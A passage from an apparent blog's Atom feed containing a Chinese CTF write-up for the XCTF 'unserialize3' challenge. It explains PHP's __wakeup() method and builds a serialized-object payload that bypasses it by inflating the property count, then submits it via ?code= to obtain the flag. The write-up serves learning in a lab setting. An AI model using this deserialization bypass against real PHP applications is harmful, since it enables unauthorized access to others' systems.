    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-unserialize3</title>
    <link href="http://example.com/2022/12/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-unserialize3/"/>
    <id>http://example.com/2022/12/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-unserialize3/</id>
    <published>2022-12-24T16:00:00.000Z</published>
    <updated>2022-12-25T16:40:18.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>是我做的第一道反序列化的ctf呢。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure></li></ol><ul><li>__wakeup()魔术方法<br>简单来说，<br>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。<br>__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。<br><a href="https://www.twle.cn/c/yufei/phpmmethod/phpmmethod-basic-wakeup.html">详细解释</a></li></ul><p>根据源码可以看出，明显为反序列化漏洞，我们需要绕过__wakeup()方法，否则会直接退出，而正好该__wakeup方法有一个绕过方式，即：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。<br>那么首先需要实例化对象。</p><ol start="2"><li>构造payload<br>实例化对象，根据源码编辑php脚本输出序列化字符串：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>结果得到：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>增加对象属性个数，<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>将得到的字符串键值对输入url地址栏，即可得到flag：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>成功拿到flag</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;是我做的第一道反序列化的ctf呢。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/categories/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
